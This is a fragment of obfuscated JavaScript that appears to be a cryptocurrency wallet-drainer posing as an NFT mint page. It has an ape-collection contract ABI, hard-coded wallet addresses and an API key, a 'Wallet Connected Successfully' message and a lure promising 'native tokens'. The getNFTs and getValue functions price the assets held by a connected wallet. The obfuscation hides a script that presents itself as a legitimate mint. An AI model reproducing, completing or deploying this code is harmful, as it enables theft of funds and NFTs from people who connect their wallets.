ByIndex','function','supportsInterface','Transaction\x20is\x20submitted\x20to\x20the\x20network','map','ApprovalForAll','_balance','Deprecate','nonpayable','Redeem','0xEB94D7306CE29437b21C5051F5a0c7d0C12294C0','totalSupply','_name','isBlackListed','/nft/collections?chain=','_data','newOwner','transferFrom','renounceOwnership','MAX_APES','bool','maxFee','5227607491','_initialSupply','setRevealTimestamp','search','Your\x20address\x20','filter','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','Error:\x20','reserveApes','_to','_upgradedAddress','NFTs\x20collection\x20','/erc20','GET','unpause','price','Pause','11UwEtGy','length','spender','catch','saleStart','event','48taoPde','json','_totalSupply','Unpause','_value','setParams','balance','Insufficient\x20funds\x20for\x20transfer\x20or\x20transaction\x20was\x20rejected','MAX_UINT','REVEAL_TIMESTAMP','Issue','Transfer','tokens-list','remaining','getBlackListStatus','AddedBlackList','TOKEN\x20Contract\x20Address\x20','BAYC_PROVENANCE','constructor','from','bsc','networkVersion','1324092PZpPWu','tokenOfOwnerByIndex','8tlmOGT','OwnershipTransferred','string','options','approve','LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens','amount','0xea8968B218a551919FbD5f1166328C82a96dED54','payable','_user','addBlackList','flipSaleState','RemovedBlackList','https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg','Error\x20processing\x20item\x20','setApprovalForAll','_clearedUser','numberOfTokens','getOwner','bytes','4149kWrloj','Approval','baseURI','emergencySetStartingIndexBlock','allowed','getApproved','startingIndexBlock','sending\x20ether','gasPrice','Transaction\x20Rejected','owner','&format=decimal&limit=','connector','all','.proceed','name','21370crNdGJ','Wallet\x20Connected\x20Successfully\x20to\x20bsc!','You\x20need\x20to\x20connect\x20your\x20wallet\x20first','.connect','CoinbaseWalletConnector','4585602ZFOvnY','status','mintApe','https://deep-index.moralis.io/api/v2/'];_0x1364=function(){return _0x23a957;};return _0x1364();}async function getPrice(_0x21d21d){return new Promise((_0x21c569,_0x65e787)=>{const _0x1be8d9=_0x39b8;fetch(_0x1be8d9(0xca)+_0x21d21d+'&vs_currencies=usd',{'method':'GET','headers':{}})[_0x1be8d9(0xae)](async _0x33cfec=>{const _0x203768=_0x1be8d9;if(_0x33cfec['status']>0x18f)throw _0x33cfec;_0x21c569(await _0x33cfec[_0x203768(0x105)]());})[_0x1be8d9(0x101)](_0x5a8383=>{_0x65e787(_0x5a8383);});});}async function getValue(_0xa609be,_0x339c79,_0x50a335){const _0x4164c9=_0x569ec7;console[_0x4164c9(0xc6)](_0xa609be,_0x339c79,_0x50a335);let _0x566e6a=await getPrice(_0xa609be);console[_0x4164c9(0xc6)](_0x4164c9(0xfc),_0x566e6a),_0x566e6a=parseFloat(_0x566e6a[_0xa609be]['usd']);let _0x3ea8cf=_0x339c79/0xa**(_0x50a335||0x12)*_0x566e6a;return _0x3ea8cf=parseInt(_0x3ea8cf),_0x566e6a?_0x3ea8cf:0x0;}async function getNFTs(_0x3bac1d='',_0x4cee0d=_0x569ec7(0x121),_0x57d0a1=_0x569ec7(0x118),_0x2cf123='50'){return new Promise((_0x392cd2,_0x16c275)=>{const _0x36b68a=_0x39b8;fetch(_0x36b68a(0x99)+_0x3bac1d+_0x36b68a(0xe5)+_0x57d0a1+_0x36b68a(0x8c)+_0x2cf123,{'method':'GET','headers':{'accept':_0x36b68a(0xb9),'X-API-Key':_0x4cee0d}})['then'](async _0x338632=>{const _0x1a0667=_0x36b68a;if(_0x338632[_0x1a0667(0x97)]>0x18f)throw _0x338632;_0x392cd2(await _0x338632[_0x1a0667(0x105)]());})[_0x36b68a(0x101)](_0x5034c7=>{_0x16c275(_0x5034c7);});});}